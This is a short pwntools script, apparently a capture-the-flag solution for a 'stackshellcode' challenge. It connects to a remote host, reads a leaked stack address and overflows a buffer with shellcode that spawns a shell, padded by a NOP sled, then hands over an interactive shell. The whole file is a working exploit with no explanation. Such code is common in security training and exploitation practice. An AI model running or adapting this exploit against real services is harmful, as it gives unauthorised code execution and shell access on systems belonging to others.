from pwn import *

# p = process("./stackshellcode")
p = remote("128.199.104.41", 20950)
context.arch = 'amd64'
padding = 408

p.recvuntil(": ")
address = int(p.recvline(), 16)
print p64(address)
shellcode = asm(shellcraft.sh())
payload = shellcode + '\x90' * (padding - len(shellcode)) + p64(address)
p.sendline(payload)
p.interactive()